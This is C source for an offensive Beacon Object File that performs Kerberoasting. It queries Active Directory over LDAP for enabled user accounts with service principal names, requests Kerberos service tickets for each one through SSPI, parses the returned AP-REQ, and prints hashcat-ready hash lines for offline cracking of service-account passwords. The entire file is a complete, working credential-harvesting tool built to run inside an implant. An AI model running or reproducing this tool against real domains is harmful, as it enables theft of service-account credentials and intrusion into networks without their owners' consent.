/*
 * bof-spnroast [spn]
 *
 * Native Kerberoasting with SSPI (no Rubeus/Impacket).  With no argument it
 * enumerates user accounts that have a servicePrincipalName over LDAP and
 * requests a service ticket for every SPN using the current logon.  A single
 * explicit SPN can also be supplied.
 *
 * Output: for RC4 tickets (etype 23) a hashcat 13100 line; for AES tickets
 * etype 17/18 a hashcat 19600/19700 line; the base64 AP-REQ is printed when
 * the ticket type cannot be encoded.  Nothing is written to disk.
 *
 * Requires a valid Kerberos TGT in the current logon (a plain password/NTLM
 * logon without a TGT will fail with SEC_E_NO_CREDENTIALS).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "ldaphelpers.h"

typedef struct {
    unsigned char tag;
    int len;
    const unsigned char *val;
    int hdr;
} der_tlv;

static int der_parse(const unsigned char *p, int remain, der_tlv *t)
{
    int i, n;

    if (remain < 2) return -1;
    t->tag = p[0];
    if (p[1] & 0x80) {
        n = p[1] & 0x7f;
        if (n < 1 || n > 3 || remain < 2 + n) return -1;
        t->len = 0;
        for (i = 0; i < n; i++)
            t->len = (t->len << 8) | p[2 + i];
        t->hdr = 2 + n;
    } else {
        t->len = p[1];
        t->hdr = 2;
    }
    if (t->len < 0 || t->len > remain - t->hdr) return -1;
    t->val = p + t->hdr;
    return 0;
}

static int der_child(const unsigned char *val, int len, unsigned char tag,
                     der_tlv *out)
{
    const unsigned char *p = val;
    int rem = len;
    while (rem > 0) {
        der_tlv c;
        int total;
        if (der_parse(p, rem, &c) != 0) return -1;
        if (c.tag == tag) { *out = c; return 0; }
        total = c.hdr + c.len;
        p += total;
        rem -= total;
    }
    return -1;
}

static int der_int(const der_tlv *outer)
{
    der_tlv in;
    int v = 0, i;
    if (der_parse(outer->val, outer->len, &in) != 0) return -1;
    if (in.tag != 0x02) return -1;
    for (i = 0; i < in.len && i < 4; i++) v = (v << 8) | in.val[i];
    return v;
}

/* Extract etype and cipher from an AP-REQ GSS token (Kerberos). */
static int parse_apreq(const unsigned char *tok, int len, int *etype,
                       const unsigned char **cipher, int *clen)
{
    int i;
    der_tlv ap, ticket, seq, enc, edata, et, ci;

    for (i = 0; i + 4 < len; i++) {
        if (tok[i] != 0x6e) continue;
        if (der_parse(tok + i, len - i, &ap) != 0) continue;
        if (ap.len < 2) continue;
        {
            der_tlv first;
            if (der_parse(ap.val, ap.len, &first) != 0 || first.tag != 0xa0)
                continue;
        }
        break;
    }
    if (i + 4 >= len) return -1;

    if (der_child(ap.val, ap.len, 0xa3, &ticket) != 0) return -1;
    if (der_parse(ticket.val, ticket.len, &seq) != 0) return -1;
    if (seq.tag == 0x61) {
        if (der_parse(seq.val, seq.len, &seq) != 0) return -1;
    }
    if (seq.tag != 0x30) return -1;
    if (der_child(seq.val, seq.len, 0xa3, &enc) != 0) return -1;
    if (der_parse(enc.val, enc.len, &edata) != 0 || edata.tag != 0x30)
        return -1;

    if (der_child(edata.val, edata.len, 0xa0, &et) != 0) return -1;
    *etype = der_int(&et);
    if (*etype < 0) return -1;

    if (der_child(edata.val, edata.len, 0xa2, &ci) != 0) return -1;
    if (der_parse(ci.val, ci.len, &ci) != 0 || ci.tag != 0x04) return -1;
    *cipher = ci.val;
    *clen = ci.len;
    return 0;
}

static void hexcat(char *dst, int dstsz, const unsigned char *p, int n)
{
    static const char h[] = "0123456789abcdef";
    int i, at = bof_strlen(dst);
    for (i = 0; i < n && at + 2 < dstsz; i++) {
        dst[at++] = h[p[i] >> 4];
        dst[at++] = h[p[i] & 15];
    }
    dst[at] = 0;
}

static void nc_to_realm(const char *nc, char *out, int outsz)
{
    const char *p = nc;
    int o = 0;
    out[0] = 0;
    while (*p && o < outsz - 1) {
        if ((p[0] == 'D' || p[0] == 'd') && (p[1] == 'C' || p[1] == 'c') &&
            p[2] == '=') {
            p += 3;
            while (*p && *p != ',' && o < outsz - 1) out[o++] = *p++;
            if (*p == ',' && o < outsz - 1) { out[o++] = '.'; p++; }
        } else {
            while (*p && *p != ',') p++;
            if (*p == ',') p++;
        }
    }
    out[o] = 0;
}

static void current_user_realm(char *user, int usz, char *realm, int rsz)
{
    char buf[512], env[256], *p;
    ULONG len = sizeof(buf);

    user[0] = 0;
    realm[0] = 0;
    if (SECUR32$GetUserNameExA(NameSamCompatible, buf, &len)) {
        p = buf;
        while (*p && *p != '\\') p++;
        if (*p == '\\') p++;
        bof_strncpy(user, p, usz);
    }
    if (!user[0] && KERNEL32$ExpandEnvironmentStringsA("%USERNAME%", buf, sizeof(buf)))
        bof_strncpy(user, buf, usz);
    if (!realm[0] && KERNEL32$ExpandEnvironmentStringsA("%USERDNSDOMAIN%", env, sizeof(env)))
        bof_strncpy(realm, env, rsz);
}

static void roast_one(const char *user, const char *realm, const char *spn)
{
    CredHandle cred;
    CtxtHandle ctx;
    TimeStamp expiry;
    SecBuffer outbuf;
    SecBufferDesc outdesc;
    SECURITY_STATUS ss;
    ULONG attrs = 0;
    int have_cred = 0;

    bof_memzero(&cred, sizeof(cred));
    bof_memzero(&ctx, sizeof(ctx));
    bof_memzero(&outbuf, sizeof(outbuf));
    bof_memzero(&outdesc, sizeof(outdesc));

    ss = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND,
                                           NULL, NULL, NULL, NULL, &cred, &expiry);
    if (ss != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] AcquireCredentialsHandle(%s): 0x%08lx\n",
                     spn, (unsigned long)ss);
        return;
    }
    have_cred = 1;

    outbuf.BufferType = SECBUFFER_TOKEN;
    outbuf.cbBuffer = 0;
    outbuf.pvBuffer = NULL;
    outdesc.ulVersion = SECBUFFER_VERSION;
    outdesc.cBuffers = 1;
    outdesc.pBuffers = &outbuf;

    ss = SECUR32$InitializeSecurityContextA(&cred, NULL, (LPSTR)spn,
                                            ISC_REQ_ALLOCATE_MEMORY, 0,
                                            SECURITY_NATIVE_DREP, NULL, 0,
                                            &ctx, &outdesc, &attrs, &expiry);
    if ((ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) &&
        outbuf.pvBuffer && outbuf.cbBuffer > 0) {
        const unsigned char *cipher = NULL;
        int etype = -1, clen = 0;
        int n = (int)outbuf.cbBuffer;

        if (parse_apreq((const unsigned char *)outbuf.pvBuffer, n, &etype,
                        &cipher, &clen) == 0 &&
            (etype == 23 || etype == 17 || etype == 18)) {
            char hash[8192];
            int conf = 16;
            int csum = (etype == 23) ? 16 : 12;

            if (clen > csum + conf) {
                bof_strncpy(hash, "$krb5tgs$", sizeof(hash));
                {
                    char num[8];
                    bof_itoa((unsigned long long)etype, num);
                    bof_strncat(hash, num, sizeof(hash) - bof_strlen(hash) - 1);
                }
                bof_strncat(hash, "$*", sizeof(hash) - bof_strlen(hash) - 1);
                bof_strncat(hash, user, sizeof(hash) - bof_strlen(hash) - 1);
                bof_strncat(hash, "$", sizeof(hash) - bof_strlen(hash) - 1);
                bof_strncat(hash, realm, sizeof(hash) - bof_strlen(hash) - 1);
                bof_strncat(hash, "$", sizeof(hash) - bof_strlen(hash) - 1);
                bof_strncat(hash, spn, sizeof(hash) - bof_strlen(hash) - 1);
                bof_strncat(hash, "*$", sizeof(hash) - bof_strlen(hash) - 1);
                hexcat(hash, sizeof(hash), cipher + clen - csum, csum);
                bof_strncat(hash, "$", sizeof(hash) - bof_strlen(hash) - 1);
                hexcat(hash, sizeof(hash), cipher, clen - csum);

                BeaconPrintf(CALLBACK_OUTPUT, "  [+] %s\n", spn);
                BeaconPrintf(CALLBACK_OUTPUT, "      %s\n", hash);
                if (etype == 23)
                    BeaconPrintf(CALLBACK_OUTPUT, "      (hashcat -m 13100)\n");
                else
                    BeaconPrintf(CALLBACK_OUTPUT, "      (hashcat -m %d)\n",
                                 etype == 17 ? 19600 : 19700);
            }
        } else {
            char b64[8192];
            BeaconPrintf(CALLBACK_OUTPUT, "  [*] %s: etype=%d, AP-REQ follows\n",
                         spn, etype);
            bof_b64_encode((const unsigned char *)outbuf.pvBuffer, n, b64,
                           sizeof(b64));
            BeaconPrintf(CALLBACK_OUTPUT, "      %s\n", b64);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "  [-] InitializeSecurityContext(%s): 0x%08lx\n",
                     spn, (unsigned long)ss);
    }

    if (outbuf.pvBuffer) SECUR32$FreeContextBuffer(outbuf.pvBuffer);
    SECUR32$DeleteSecurityContext(&ctx);
    if (have_cred) SECUR32$FreeCredentialsHandle(&cred);
}

void go(char *args, int alen)
{
    datap parser;
    char *only = "";
    int olen = 0;
    char user[256], realm[256], base[512];
    LDAP *ld = NULL;
    int total = 0;

    BeaconDataParse(&parser, args, alen);
    only = BeaconDataExtract(&parser, &olen);
    if (!only) only = "";

    current_user_realm(user, sizeof(user), realm, sizeof(realm));

    BeaconPrintf(CALLBACK_OUTPUT, "================ SPN roast ================\n");

    if (only[0]) {
        if (!realm[0]) {
            BeaconPrintf(CALLBACK_ERROR, "cannot determine realm; set USERDNSDOMAIN\n");
            return;
        }
        if (!user[0]) bof_strcpy(user, "?");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] user %s@%s, SPN %s\n", user, realm, only);
        roast_one(user, realm, only);
        return;
    }

    ld = bof_ldap_open();
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR,
                     "LDAP connect/bind failed (use: spnroast <spn>)\n");
        return;
    }
    if (bof_ldap_default_nc(ld, base, sizeof(base)) == 0)
        nc_to_realm(base, realm, sizeof(realm));
    if (!realm[0]) {
        BeaconPrintf(CALLBACK_ERROR, "cannot determine realm from LDAP/%USERDNSDOMAIN\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] realm: %s\n", realm);

    {
        PCHAR attrs[3];
        LDAPMessage *res = NULL;
        LDAPMessage *e;
        ULONG rc;

        attrs[0] = "sAMAccountName";
        attrs[1] = "servicePrincipalName";
        attrs[2] = NULL;

        rc = WLDAP32$ldap_search_ext_sA(ld, base, LDAP_SCOPE_SUBTREE,
                "(&(objectClass=user)(servicePrincipalName=*)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                attrs, 0, NULL, NULL, NULL, 500, &res);
        if (rc != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "LDAP search failed: %lu (%s)\n",
                         (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
            WLDAP32$ldap_unbind(ld);
            return;
        }

        for (e = WLDAP32$ldap_first_entry(ld, res); e && total < 200;
             e = WLDAP32$ldap_next_entry(ld, e)) {
            char sam[256];
            struct berval **spns;
            ULONG i;

            if (bof_ldap_get_str(ld, e, "sAMAccountName", sam, sizeof(sam)) != 0)
                bof_strcpy(sam, "?");
            spns = WLDAP32$ldap_get_values_lenA(ld, e, "servicePrincipalName");
            if (!spns) continue;
            for (i = 0; spns[i] && total < 200; i++) {
                char spn[512];
                ULONG n = spns[i]->bv_len < sizeof(spn) - 1 ?
                          spns[i]->bv_len : sizeof(spn) - 1;
                bof_memcpy(spn, spns[i]->bv_val, n);
                spn[n] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %s\\%s\n", realm, sam);
                roast_one(sam, realm, spn);
                total++;
            }
            WLDAP32$ldap_value_free_len(spns);
        }
        WLDAP32$ldap_msgfree(res);
    }

    WLDAP32$ldap_unbind(ld);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d SPN(s) processed\n", total);
}
